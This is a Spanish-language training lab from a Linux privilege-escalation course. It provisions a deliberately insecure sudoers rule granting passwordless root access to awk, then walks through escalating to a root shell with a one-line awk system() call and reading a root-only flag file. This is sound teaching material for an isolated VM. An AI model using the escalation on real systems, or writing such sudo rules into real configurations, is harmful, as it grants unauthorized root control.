# Laboratorio: regla de sudo insegura

[Inicio](../../../README.md) | [Privilege Escalation](../../README.md) | [Capítulo 03](../README.md)

> [!CAUTION]
> El script `setup.sh` crea una regla de `sudo` vulnerable de forma intencional. Ejecútalo solo en la máquina virtual Ubuntu aislada y sin conexión a redes no confiables. Restaura la instantánea al terminar para eliminar la configuración creada.

## Alcance

Este laboratorio provisiona una regla de sudoers que autoriza a la cuenta `student` a ejecutar `/usr/bin/awk` como `root` sin contraseña. El objetivo es descubrir la regla con `sudo -l`, comprender por qué un procesador de texto con acceso a `system()` permite abrir una shell y verificar la elevación leyendo un archivo reservado a `root`.

La práctica se limita a una única máquina virtual Ubuntu. No incluye persistencia, movimiento lateral ni modificaciones fuera del sistema provisionado.

## Requisitos

- Ubuntu Server 22.04 LTS o superior en red host-only.
- Instantánea limpia creada antes de ejecutar la preparación.
- Acceso `sudo` para ejecutar el aprovisionamiento.
- Cuenta `student`, creada por `setup.sh` si no existe.
- El archivo `setup.sh` de este directorio.

## Preparación

Desde esta carpeta, ejecuta el aprovisionamiento como administrador:

```bash
sudo bash setup.sh
```

El script crea la cuenta `student` si no existe, detecta la ruta real de `awk` con `command -v awk`, escribe `/etc/sudoers.d/privesc-lab` con la regla `student ALL=(root) NOPASSWD: <ruta-awk>`, la valida con `visudo -cf` y crea `/root/flag.txt` con permisos `0600`. Al finalizar imprime un resumen de lo provisionado.

## Pasos

### 1. Acceder como student

La cuenta `student` usa la contraseña de laboratorio `student`. Inicia sesión desde una sesión con privilegios o con `su`:

```bash
sudo su - student
# o, desde una consola: su - student
```

Confirma la identidad y el directorio de trabajo:

```bash
id
pwd
```

La salida debe mostrar un UID distinto de `0`.

### 2. Enumerar la política de sudo

Consulta las reglas que afectan a la cuenta:

```bash
sudo -l
```

La salida contiene una entrada similar a:

```text
Matching Defaults entries for student on lab:
    env_reset, mail_badpass, secure_path=...

User student may run the following commands on lab:
    (root) NOPASSWD: /usr/bin/awk
```

La regla autoriza `/usr/bin/awk` con identidad `root` y sin contraseña. En la sección 3 del capítulo se explica por qué una autorización así es insegura.

### 3. Razonar el riesgo de la regla

`awk` incluye la función `system()`, que entrega una cadena al shell del sistema, y el bloque `BEGIN`, que se ejecuta antes de leer cualquier entrada. Autorizar el binario como `root` equivale, por tanto, a autorizar la ejecución de comandos arbitrarios con EUID `0`. La restricción de sudoers no limita lo que `awk` puede hacer una vez en marcha.

### 4. Abrir una shell como root

Invoca `awk` mediante `sudo` y solicita una shell desde el bloque `BEGIN`:

```bash
sudo awk 'BEGIN{system("/bin/sh")}'
```

La shell que aparece no devuelve prompt de inmediato; es el proceso `/bin/sh` ejecutándose con la identidad de `awk`. Para salir de ella y volver a la sesión de `student`, escribe:

```sh
exit
```

El mensaje de retorno a la sesión anterior es la señal de que la shell privilegiada terminó correctamente.

### 5. Confirmar el UID efectivo

Dentro de la shell privilegiada, comprueba la identidad:

```bash
id
```

La salida esperada muestra el UID `0`:

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 6. Leer el flag

Con la shell privilegiada activa, lee el archivo reservado a `root`:

```bash
cat /root/flag.txt
```

El contenido impreso es el valor de laboratorio escrito por `setup.sh`. Anota el valor y sal de la shell con `exit`.

## Resultados esperados

- `sudo -l` muestra `(root) NOPASSWD: /usr/bin/awk`.
- `sudo awk 'BEGIN{system("/bin/sh")}'` abre una shell.
- `id` dentro de la shell devuelve `uid=0(root)`.
- `cat /root/flag.txt` muestra el valor de laboratorio.
- `exit` cierra la shell privilegiada y devuelve a la sesión de `student`.

```text
[ ] La regla NOPASSWD sobre /usr/bin/awk aparece en sudo -l
[ ] La shell abierta ejecuta id como uid=0(root)
[ ] El contenido de /root/flag.txt es legible y correcto
[ ] La sesión vuelve a student al salir de la shell
```

## Validación

La evidencia técnica de la elevación es doble. Primero, el UID efectivo dentro de la shell debe ser `0`:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Segundo, el contenido de `/root/flag.txt` debe coincidir con el valor de laboratorio. Antes de la explotación, la misma lectura falla por falta de permisos, lo que confirma que el acceso se debe a la regla de `sudo` y no a un permiso previo:

```bash
cat /root/flag.txt
```

```text
cat: /root/flag.txt: Permission denied
```

La diferencia entre ambos intentos demuestra que la regla `NOPASSWD: /usr/bin/awk` es la causa raíz de la elevación.

## Limpieza

Elimina la configuración creada por el aprovisionamiento:

```bash
sudo rm -f /etc/sudoers.d/privesc-lab /root/flag.txt
```

La vía preferida es restaurar la instantánea limpia de la máquina virtual, que revierte cualquier cambio, incluida la cuenta `student` si no existía antes. Si se eliminó la regla manualmente, valida que sudoers sigue siendo consistente:

```bash
sudo visudo -cf /etc/sudoers
```

---

[Volver al capítulo](../README.md) | [Volver al índice](../../README.md) | [Inicio](../../../README.md)
